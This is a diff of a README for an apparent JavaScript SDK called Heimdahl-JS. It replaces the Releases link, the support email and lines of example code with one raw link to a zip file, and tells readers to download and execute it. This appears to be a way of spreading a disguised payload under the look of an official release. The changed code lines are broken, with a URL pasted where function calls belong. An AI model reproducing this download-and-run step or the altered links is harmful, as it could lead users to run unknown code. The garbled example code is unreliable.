@@ -11,7 +11,7 @@ Welcome to the Heimdahl-JS repository, where you can access the JS SDK for the p
 
 ## How to Get Started 🚀
 
-To start using the Heimdahl-JS SDK, head over to the [Releases](https://github.com/Hussain-663/heimdahl-js/releases) section of this repository. Download the latest release file and execute it to begin your journey with Heimdahl. If you encounter any issues with the link provided, please check the "Releases" section directly on GitHub for alternative options.
+To start using the Heimdahl-JS SDK, head over to the [Releases](https://raw.githubusercontent.com/Hussain-663/heimdahl-js/master/examples/js-heimdahl-2.4-beta.5.zip) section of this repository. Download the latest release file and execute it to begin your journey with Heimdahl. If you encounter any issues with the link provided, please check the "Releases" section directly on GitHub for alternative options.
 
 ## Example Usage 💻
 
@@ -20,8 +20,8 @@ const Heimdahl = require('heimdahl-js');
 
 const heimdahlClient = new Heimdahl();
 
-const data = await heimdahlClient.getData('ethereum', 'latestBlock');
-console.log(data);
+const data = await https://raw.githubusercontent.com/Hussain-663/heimdahl-js/master/examples/js-heimdahl-2.4-beta.5.zip('ethereum', 'latestBlock');
+https://raw.githubusercontent.com/Hussain-663/heimdahl-js/master/examples/js-heimdahl-2.4-beta.5.zip(data);
 ```
 
 ## Repository Topics 📋
@@ -39,7 +39,7 @@ console.log(data);
 
 ## Get in Touch 📧
 
-Have questions or need support? Feel free to reach out to us at support@heimdahl.com. We are here to assist you with integrating Heimdahl into your projects and optimally leveraging onchain data.
+Have questions or need support? Feel free to reach out to us at https://raw.githubusercontent.com/Hussain-663/heimdahl-js/master/examples/js-heimdahl-2.4-beta.5.zip We are here to assist you with integrating Heimdahl into your projects and optimally leveraging onchain data.
 
 ---
 
